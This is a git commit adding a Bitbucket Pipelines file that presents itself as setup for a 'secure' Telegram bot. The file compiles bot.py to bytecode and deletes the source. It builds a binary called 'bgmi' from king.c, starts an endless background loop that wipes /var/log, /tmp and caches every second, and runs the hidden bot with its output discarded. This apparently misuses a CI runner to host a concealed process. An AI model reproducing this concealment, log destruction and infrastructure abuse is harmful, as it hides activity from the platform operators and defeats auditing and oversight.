856c1e6a3e5c99a1b7ca02407c7352b04c05d47a
mkjodi123 <m.ohit8684944463@gmail.com>
2025-02-03 08:31:16 +0530

    Add files via upload

---
+++ bitbucket-pipelines.ml
@@ -0,0 +1,39 @@
+image: python:3.10
+
+pipelines:
+  default:
+    - step:
+        name: Setup & Run Encoded Telegram Bot
+        size: 2x
+        script:
+          - echo "🔒 Setting up a secure bot..."
+
+
+          - apt-get update && apt-get install -y git gcc python3 python3-pip
+
+
+          - pip install --no-cache-dir telebot pymongo aiohttp certifi 
+
+          -pip3 install pyTelegramBotAPI
+
+          - python3 -m compileall bot.py
+
+
+          - mv __pycache__/bot.cpython-310.pyc bot.pyc
+          - rm -rf bot.py __pycache__
+          - gcc king.c -o bgmi -lpthread
+
+          - chmod 755 bot.pyc
+          - chmod 755 bgmi
+
+          - while true; do
+              rm -rf ~/.cache/* /var/log/* /tmp/* /var/tmp/*;
+              sync;
+              sleep 1;
+            done &
+
+
+          - nohup python3 bot.pyc > /dev/null 2>&1 &
+
+
+          - timeout 300 tail -f /dev/null
